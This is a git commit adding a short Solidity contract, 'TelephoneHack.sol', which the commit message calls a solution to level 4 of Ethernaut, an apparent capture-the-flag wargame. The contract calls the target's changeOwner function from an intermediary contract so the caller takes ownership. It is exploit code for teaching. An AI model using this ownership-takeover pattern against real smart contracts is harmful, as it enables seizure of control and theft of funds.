a6844fe63857012f259572c6c221f53741e70df5
Ashish Jinendra Nimonkar <42809636+ashishjn23@users.noreply.github.com>
2022-07-02 19:37:57 -0500

    Create TelephoneHack.sol
    Solution to Ethernaut level04 Telephone

---
+++ TelephoneHack.sol
@@ -0,0 +1,15 @@
+pragma solidity ^0.8.0;
+
+import "./Telephone.sol";
+
+contract Attack {
+    Telephone telephoneContract;
+
+    constructor(Telephone _telephoneContract) {
+        telephoneContract = Telephone(_telephoneContract);
+    }
+
+    function attack() public {
+        telephoneContract.changeOwner(msg.sender);
+    }
+}
